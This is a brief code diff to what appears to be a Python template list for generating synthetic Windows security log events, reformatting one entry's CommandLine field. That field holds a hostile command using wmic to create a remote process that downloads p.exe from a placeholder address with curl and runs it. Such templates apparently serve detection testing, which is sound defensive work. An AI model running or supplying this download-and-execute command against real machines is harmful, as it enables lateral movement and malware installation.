@@ -1245,7 +1245,10 @@ TEMPLATES: list[Template] = [
                 Computer="{host}",
                 User="{user}",
                 Image="C:\\Windows\\System32\\wbem\\wmic.exe",
-                CommandLine='wmic /node:{target_host} process call create "cmd /c curl http://{ip}/p.exe -o C:\\Users\\Public\\p.exe && C:\\Users\\Public\\p.exe"',
+                CommandLine=(
+                    "wmic /node:{target_host} process call create "
+                    '"cmd /c curl http://{ip}/p.exe -o C:\\Users\\Public\\p.exe && C:\\Users\\Public\\p.exe"'
+                ),
             ),
         ),
     ),
